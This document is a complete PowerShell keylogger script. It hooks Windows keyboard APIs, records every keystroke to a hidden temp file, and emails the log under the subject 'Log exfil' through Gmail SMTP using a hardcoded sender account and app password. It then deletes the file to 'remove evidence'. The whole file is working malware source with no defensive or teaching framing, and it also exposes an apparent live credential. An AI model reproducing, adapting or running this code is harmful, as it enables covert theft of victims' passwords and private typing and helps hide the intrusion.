# set config for email
$From = "injectionkeystroke@gmail.com"
$To = "maklo119@hhu.de"
$Subject = "Log exfil from $($env:computername) User:$($env:UserName)"
$Password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password

function Logger($logFile="$env:temp/a.log") {

  #check if logger needs to create file
  if (Test-Path $logFile) {
    # Dateiinhalt auslesen
    $content = Get-Content -Path $logFile
    # Send mail
    Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
    # Remove evidence
    Remove-Item $logFile -Force
  }

  # generate log file
  New-Item -ItemType File -Path $logFile  -Force

  # API signatures
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 # set up API
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

  # attempt to log keystrokes
  try {
    while ($true) {
      Start-Sleep -Milliseconds 10
      #iterate through all keys to see if they are pressed
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        #get key state
        $keystate = $API::GetAsyncKeyState($ascii)
        # check if key is pressed
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock
          # map virtual key
          $mapKey = $API::MapVirtualKey($ascii, 3)
          # get keyboard state and create stringbuilder
          $keyboardState = New-Object Byte[] 256
          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
            # add logged key to file
            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }

  # send logs if code fails
  finally {
    notepad $logFile
    # Dateiinhalt auslesen
    $content = Get-Content -Path $logFile
    # Send mail
    Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
    # Remove evidence
    Remove-Item $logFile -Force
  }
}

# run logger
Logger
